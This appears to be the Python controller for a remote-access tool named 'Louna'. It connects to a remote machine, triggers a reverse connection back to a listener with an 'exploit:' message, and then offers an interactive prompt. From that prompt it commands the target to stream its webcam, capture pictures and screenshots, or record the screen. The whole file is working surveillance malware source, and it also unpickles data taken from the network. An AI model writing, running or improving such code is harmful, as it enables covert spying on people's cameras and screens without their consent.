import socket
import struct
import pickle
import cv2
import threading
import queue
import numpy as np
import json
from colorama import Fore, init
init(autoreset=True)

class Louna:
    stop_event = threading.Event()
    video_queue = queue.Queue()
    picture_queue = queue.Queue()

    language = {}
    
    # Modules
    def render_video(self):
        data = b''
        video_size = struct.calcsize('!I')

        while not self.stop_event.is_set():
            while len(data) < video_size:
                data += self.socket.recv(4096)

            packed_size = data[:video_size]
            data = data[video_size:]
            msg_size = struct.unpack('!I', packed_size)[0]

            while len(data) < msg_size:
                data += self.socket.recv(4096)

            frame_data = data[:msg_size]
            data = data[msg_size:]
            frame = pickle.loads(frame_data)
            frame = cv2.imdecode(frame, cv2.IMREAD_COLOR)
            if frame is None:
                self.message_error(self.language['f_d_f'])

            self.video_queue.put(frame)

    def render_image(self):
        data = b''
        image_size = struct.calcsize('!I')

        while len(data) < image_size:
            data += self.socket.recv(4096)

        packed_size = data[:image_size]
        data = data[image_size:]
        msg_size = struct.unpack('!I', packed_size)[0]

        while len(data) < msg_size:
            data += self.socket.recv(4096)

        frame_data = data[:msg_size]
        data = data[msg_size:]
        frame = pickle.loads(frame_data)
        frame = cv2.imdecode(frame, cv2.IMREAD_COLOR)
        if frame is None:
            self.message_error(self.language['f_d_f'])

        self.picture_queue.put(frame)

    def screenshot(self):
        data = b''
        image_size = struct.calcsize('!I')

        while len(data) < image_size:
            data += self.socket.recv(4096)

        packed_size = data[:image_size]
        data = data[image_size:]
        msg_size = struct.unpack('!I', packed_size)[0]

        while len(data) < msg_size:
            data += self.socket.recv(4096)

        frame_data = data[:msg_size]
        data = data[msg_size:]
        nparr = np.frombuffer(frame_data, np.uint8)
        frame = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
        if frame is None:
            self.message_error(self.language['f_d_f'])

        self.picture_queue.put(frame)

    def message_success(self, message):
        print(Fore.GREEN + '[-] ' + message)

    def message_error(self, message):
        print(Fore.RED + '[-] ' + message)

    def help(self):
        print(Fore.GREEN + f'webcam  - {self.language['a_w']}')
        print(Fore.GREEN + f'picture - {self.language['t_p']}')
        print(Fore.GREEN + f'screenshot - ')
        print(Fore.GREEN + f'screen recording - ')

    def listen(self):
        self.socket_cmd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket_cmd.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket_cmd.bind((self.addr_cmd, self.port_cmd))
        self.socket_cmd.listen(3)
        self.message_success(self.language['w_t_r'])
        self.socket.send(f'exploit:{self.addr_cmd}:{self.port_cmd}'.encode())

        while True:
            self.client, self.address = self.socket_cmd.accept()
            self.message_success(self.language['a_g'])

            while True:
                try:
                    cmd = input(Fore.GREEN + '[+] Louna > ')
                except KeyboardInterrupt:
                    print('\n')
                    self.message_error(self.language['c_c_d'])
                    exit()

                if cmd == 'webcam':
                    self.client.send(b'webcam')
                    self.stop_event.clear()
                    threading.Thread(target=self.render_video, daemon=True).start()
                    while not self.stop_event.is_set():
                        cv2.imshow(self.language['vd'], self.video_queue.get())
                        if cv2.waitKey(1) & 0xFF == ord('q'):
                            self.video_queue.task_done()
                            self.stop_event.set()
                            cv2.destroyAllWindows()
                            self.client.send(b'close event')
                            break

                if cmd == 'picture':
                    self.client.send(b'picture')
                    self.stop_event.clear()
                    threading.Thread(target=self.render_image, daemon=True).start()
                    cv2.imshow(self.language['pctr'], self.picture_queue.get())
                    self.picture_queue.task_done()
                    self.stop_event.set()
                    while True:
                        if cv2.waitKey(1) & 0xFF == ord('q'):
                            cv2.destroyAllWindows()
                            break

                if cmd == 'screenshot':
                    self.client.send(b'screenshot')
                    self.stop_event.clear()
                    threading.Thread(target=self.screenshot, daemon=True).start()
                    cv2.imshow(self.language['scrnsht'], self.picture_queue.get())
                    self.picture_queue.task_done()
                    self.stop_event.set()
                    while True:
                        if cv2.waitKey(1) & 0xFF == ord('q'):
                            cv2.destroyAllWindows()
                            break

                if cmd == 'screen recording':
                    self.client.send(b'screen recording')
                    self.stop_event.clear()
                    threading.Thread(target=self.render_video, daemon=True).start()
                    while not self.stop_event.is_set():
                        cv2.imshow(self.language['s_r'], self.video_queue.get())
                        if cv2.waitKey(1) & 0xFF == ord('q'):
                            self.video_queue.task_done()
                            self.stop_event.set()
                            cv2.destroyAllWindows()
                            self.client.send(b'close event')
                            break

                if cmd == 'help':
                    self.help()
                if cmd == 'exit':
                    self.message_error(self.language['g_b'])
                    exit()

    def connect(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.socket.connect((self.addr, self.port))
        except ConnectionRefusedError:
            self.message_error(self.language['s_n_l'])
            exit()
        
        self.message_success(f'{self.language['s_c_t']} {self.addr}:{self.port}'.replace(' {address}:{port}', ''))
        try:
            self.message_success(self.language['l_a'])
            self.addr_cmd = input(Fore.GREEN + f'[?] {self.language['addr']} > ')
            self.port_cmd = int(input(Fore.GREEN + f'[?] {self.language['port']} > '))
        except ValueError:
            print('\n')
            self.message_error(self.language['p_n_v'])
            exit()
        except KeyboardInterrupt:
            print('\n')
            self.message_error(self.language['c_c_d'])
            exit()
        self.listen()

    def load_language(self):
        try:
            self.current_language = 'en'
            with open(f'config/language/{self.current_language}.json', 'r') as file:
                try:
                    self.language = json.loads(file.read())
                except:
                    print(Fore.RED + '[-] Failed to parse languages')
        except FileNotFoundError:
            print(Fore.RED + f'[-] Failed to load languages')

    def __init__(self):
        try:
            self.load_language()
            self.addr = input(Fore.GREEN + f'[?] {self.language['addr']} > ')
            self.port = int(input(Fore.GREEN + f'[?] {self.language['port']} > '))
        except ValueError:
            print('\n')
            self.message_error(self.language['p_n_v'])
            exit()
        except KeyboardInterrupt:
            print('\n')
            self.message_error(self.language['c_c_d'])
            exit()

        try:
            self.connect()
        finally:
            self.socket.close()

louna = Louna()